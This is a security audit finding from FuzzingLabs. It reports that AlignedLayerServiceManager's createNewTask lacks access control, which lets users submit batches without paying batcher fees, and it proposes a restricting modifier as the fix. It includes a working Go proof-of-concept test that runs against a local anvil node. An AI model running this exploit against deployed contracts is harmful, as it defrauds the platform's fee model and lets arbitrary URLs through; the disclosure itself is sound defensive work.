# A batch can be submitted without paying batcher fees

**Author(s):** Mohammed Benhelli [@Fuzzinglabs](https://github.com/FuzzingLabs/)

**Date:** 09/08/2024

### **Executive summary**

During the process of auditing the code and developing fuzzing harnesses, we found that an AlignedLayer user can submit 
a batch without paying the required fees to the batcher. This vulnerability can cause various issues:
- The economic model of the platform can be affected.
- Arbitrary URLs can be submitted.

### Vulnerability Details

- **Severity:** High
- **Affected Component:** `AlignedLayerServiceManager` contract.


## Environment

- **Distro Version:** Ubuntu 22.04.4 LTS
- **Additional Environment Details:** go version go1.22.5 linux/amd64

### Root Cause Analysis

The root cause of the vulnerability is that the `AlignedLayerServiceManager.createNewTask` can be called by anyone
instead of allowing only the `BatcherPaymentService`.

```solidity
...
contract AlignedLayerServiceManager is
    ...
{
    ...
    function createNewTask(
        bytes32 batchMerkleRoot,
        string calldata batchDataPointer
    ) external payable {
        ...
        if (msg.value > 0) {
            batchersBalances[msg.sender] += msg.value;
        }
         
         require(batchersBalances[msg.sender] > 0, "Batcher balance is empty");
        ...
    }
}
```

Sending a transaction to the `createNewTask` function with only the aggregator fees will allow the user to validate a 
batch without paying all the required fees.


### Reproducer

1. Start an anvil node
    ```shell
    make anvil_start_with_block_time
    ```
2. Start the aggregator
    ```shell
    make aggregator_start
    ```
3. Start the batcher
    ```shell
    make batcher_start
    ```
4. Start the operator
    ```shell
    make operator_register_and_start
    ```
5. Create a file in your test folder with the following content
   ```go
   package no_fees_test
   
   import (
       "context"
       "crypto/ecdsa"
       "github.com/ethereum/go-ethereum/accounts/abi/bind"
       "github.com/ethereum/go-ethereum/common"
       "github.com/ethereum/go-ethereum/common/hexutil"
       gethtypes "github.com/ethereum/go-ethereum/core/types"
       "github.com/ethereum/go-ethereum/crypto"
       "github.com/ethereum/go-ethereum/ethclient"
       "github.com/ethereum/go-ethereum/params"
       contractAlignedLayerServiceManager "github.com/yetanotherco/aligned_layer/contracts/bindings/AlignedLayerServiceManager"
       "math/big"
       "testing"
       "time"
   )
   
   type AlignedUser struct {
       Signer      gethtypes.Signer
       Client      *ethclient.Client
       PrivateKey  *ecdsa.PrivateKey
       UserAddress common.Address
       Name        string
   }
   
   func NewAlignedUser(t *testing.T, privateKey []byte, client *ethclient.Client, addr common.Address, name string) *AlignedUser {
       key, err := crypto.ToECDSA(privateKey)
       if err != nil {
           t.Fatalf("could not create private key: %s", err)
       }
       return &AlignedUser{
           Signer:      gethtypes.NewCancunSigner(big.NewInt(31337)),
           Client:      client,
           PrivateKey:  key,
           UserAddress: addr,
           Name:        name,
       }
   }
   
   func (u *AlignedUser) SendTransaction(tx *gethtypes.Transaction) error {
       signedTx, err := gethtypes.SignTx(tx, u.Signer, u.PrivateKey)
       if err != nil {
           return err
       }
       return u.Client.SendTransaction(context.TODO(), signedTx)
   }
   
   func (u *AlignedUser) getNonce() *big.Int {
       nonce, err := u.Client.NonceAt(context.Background(), u.UserAddress, nil)
       if err != nil {
           panic(err)
       }
       return new(big.Int).SetUint64(nonce)
   }
   
   func NewAnvilClient(t *testing.T) *ethclient.Client {
       client, err := ethclient.Dial("http://localhost:8545")
       if err != nil {
           t.Fatalf("could not connect to anvil: %s", err)
       }
       return client
   }
   
   var (
       alicePrivateKey = func() []byte {
           key, err := hexutil.Decode("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80")
           if err != nil {
               panic(err)
           }
           return key
       }()
       aliceAddress = func() common.Address {
           addr, err := common.NewMixedcaseAddressFromString("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
           if err != nil {
               panic(err)
           }
           return addr.Address()
       }()
       alignedLayerServiceManagerAddress = func() common.Address {
           addr, err := common.NewMixedcaseAddressFromString("0x1613beB3B2C4f22Ee086B2b38C1476A3cE7f78E8")
           if err != nil {
               panic(err)
           }
           return addr.Address()
       }()
   )
   
   func CreateNewTask(t *testing.T, user *AlignedUser, contractAddress common.Address, merkleRoot [32]byte, dataPointer string) {
       serviceManager, err := contractAlignedLayerServiceManager.NewContractAlignedLayerServiceManager(
           contractAddress,
           user.Client,
       )
       if err != nil {
           t.Fatalf("could not create service manager: %s", err)
       }
   
       createTx, err := serviceManager.CreateNewTask(
           &bind.TransactOpts{
               From:  user.UserAddress,
               Nonce: user.getNonce(),
               Signer: func(addr common.Address, tx *gethtypes.Transaction) (*gethtypes.Transaction, error) {
                   return gethtypes.SignTx(tx, user.Signer, user.PrivateKey)
               },
               Value:    new(big.Int).SetUint64(400_000_000_000_000),
               GasLimit: params.GenesisGasLimit / 2,
           },
           merkleRoot,
           dataPointer,
       )
       if err != nil {
           t.Fatalf("could not create task: %s", err)
       }
   
       i := 0
       r := new(gethtypes.Receipt)
       for {
           r, err = user.Client.TransactionReceipt(context.TODO(), createTx.Hash())
           if i > 10 {
               return
           }
           i++
           if err != nil {
               if err.Error() != "not found" {
                   t.Fatal(err)
               }
               time.Sleep(1 * time.Second)
               continue
           }
           if r.Status != 0 {
               break
           }
           time.Sleep(1 * time.Second)
       }
   
   }
   
   func TestAlignedLayerServiceManagerCreateNewTaskNoFees(t *testing.T) {
       client := NewAnvilClient(t)
       alice := NewAlignedUser(t, alicePrivateKey, client, aliceAddress, "alice")
       root, err := hexutil.Decode("0x6d98869357cfd232e6272bbce5c0174c27bf4580110a61dc048da1b5cccc9e8f")
       if err != nil {
           t.Fatalf("could not decode root: %s", err)
       }
       testCases := []struct {
           merkleRoot  [32]byte
           dataPointer string
           alignedUser *AlignedUser
       }{
           {
               merkleRoot:  [32]byte(root),
               dataPointer: "https://storage.alignedlayer.com/6d98869357cfd232e6272bbce5c0174c27bf4580110a61dc048da1b5cccc9e8f.json",
               alignedUser: alice,
           },
       }
   
       for _, tc := range testCases {
           CreateNewTask(t, tc.alignedUser, alignedLayerServiceManagerAddress, tc.merkleRoot, tc.dataPointer)
       }
   }
   ```
6. Run the test
    ```shell
    go test -v -run TestAlignedLayerServiceManagerCreateNewTaskNoFees
    ```

### Remediation

Add a modifier to the `createNewTask` function to allow only the `BatcherPaymentService` to call it if only one
`BatcherPaymentService` will be deployed.